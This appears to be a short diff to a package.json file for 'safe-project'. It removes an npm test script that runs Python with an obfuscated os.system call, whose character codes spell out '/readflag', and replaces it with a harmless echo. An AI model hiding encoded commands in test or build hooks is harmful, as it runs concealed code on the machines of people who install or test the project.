@@ -2,6 +2,6 @@
   "name": "safe-project",
   "version": "1.0.0",
   "scripts": {
-    "test": "python3 -c \"import os; os.system(''.join(chr(i) for i in [47, 114, 101, 97, 100, 102, 108, 97, 103]))\""
+    "test": "echo 'Safe'"
   }
 }
